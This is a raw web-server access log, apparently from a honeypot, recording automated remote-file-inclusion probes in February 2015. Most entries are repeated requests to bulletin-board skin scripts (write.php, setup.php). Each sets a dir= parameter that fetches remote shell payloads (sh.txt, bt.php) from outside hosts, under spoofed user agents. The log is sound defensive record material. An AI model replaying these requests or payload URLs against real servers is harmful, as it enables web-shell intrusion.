112.218.68.155 - - [20/Feb/2015:22:32:25 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [20/Feb/2015:22:32:30 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:32:31 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:32:31 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:32:32 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
176.31.252.38 - - [20/Feb/2015:22:32:58 -0800] "GET ////skin/happycast_black/write.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:32:59 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:33:00 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:33:01 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
114.202.2.31 - - [20/Feb/2015:22:33:28 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [20/Feb/2015:22:33:30 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [20/Feb/2015:22:33:31 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [20/Feb/2015:22:33:32 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:33:39 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:33:41 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:33:41 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:33:42 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
114.202.2.31 - - [20/Feb/2015:22:34:14 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:34:16 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:34:16 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:34:18 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
198.50.146.246 - - [20/Feb/2015:22:35:11 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:35:12 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:35:12 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [20/Feb/2015:22:35:13 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
176.31.252.38 - - [20/Feb/2015:22:37:41 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
198.50.146.246 - - [20/Feb/2015:22:37:41 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
176.31.252.38 - - [20/Feb/2015:22:37:42 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
198.50.146.246 - - [20/Feb/2015:22:37:42 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [20/Feb/2015:22:37:42 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
176.31.252.38 - - [20/Feb/2015:22:37:42 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
198.50.146.246 - - [20/Feb/2015:22:37:43 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
176.31.252.38 - - [20/Feb/2015:22:37:44 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
198.50.146.246 - - [20/Feb/2015:22:37:51 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [20/Feb/2015:22:37:52 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [20/Feb/2015:22:37:52 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [20/Feb/2015:22:37:54 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
66.249.79.8 - - [20/Feb/2015:22:38:07 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
112.218.68.155 - - [20/Feb/2015:22:38:48 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:38:50 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:38:50 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:38:52 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:39:24 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:39:25 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:39:26 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:39:27 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [20/Feb/2015:22:40:00 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:40:01 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:40:01 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:40:02 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [20/Feb/2015:22:40:08 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:40:10 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:40:10 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:40:13 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [20/Feb/2015:22:41:25 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:41:26 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:41:27 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:41:29 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [20/Feb/2015:22:43:28 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:29 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:29 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:30 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:30 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:32 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:32 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:43:33 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [20/Feb/2015:22:43:36 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [20/Feb/2015:22:43:37 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [20/Feb/2015:22:43:37 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [20/Feb/2015:22:43:38 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
118.129.167.21 - - [20/Feb/2015:22:46:51 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [20/Feb/2015:22:46:52 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [20/Feb/2015:22:46:53 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [20/Feb/2015:22:46:54 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
104.130.161.117 - - [20/Feb/2015:22:47:13 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [20/Feb/2015:22:47:13 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [20/Feb/2015:22:47:15 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.116 - - [20/Feb/2015:22:47:15 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [20/Feb/2015:22:47:19 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.117 - - [20/Feb/2015:22:47:19 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [20/Feb/2015:22:47:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.115 - - [20/Feb/2015:22:47:20 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
203.58.0.155 - - [20/Feb/2015:22:52:46 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [20/Feb/2015:22:52:47 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [20/Feb/2015:22:52:48 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [20/Feb/2015:22:52:50 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
104.130.161.113 - - [20/Feb/2015:22:59:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.113 - - [20/Feb/2015:22:59:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
91.236.74.185 - - [20/Feb/2015:22:59:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://articles.pubarticles.com/how-to-write-a-good-persuasive-essay-1424182817,1503765.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36 OPR/26.0.1656.24" 
176.31.252.38 - - [20/Feb/2015:23:07:58 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:07:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:07:59 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:08:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:08:00 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:08:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:08:02 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:08:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:09:31 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:32 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:32 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:34 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:34 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:35 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:35 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:23:09:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
203.58.0.155 - - [20/Feb/2015:23:10:00 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
203.58.0.155 - - [20/Feb/2015:23:10:01 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
203.58.0.155 - - [20/Feb/2015:23:10:02 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
203.58.0.155 - - [20/Feb/2015:23:10:03 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
104.130.161.116 - - [20/Feb/2015:23:11:15 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.116 - - [20/Feb/2015:23:11:15 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
176.31.252.38 - - [20/Feb/2015:23:23:08 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:09 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [20/Feb/2015:23:23:09 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
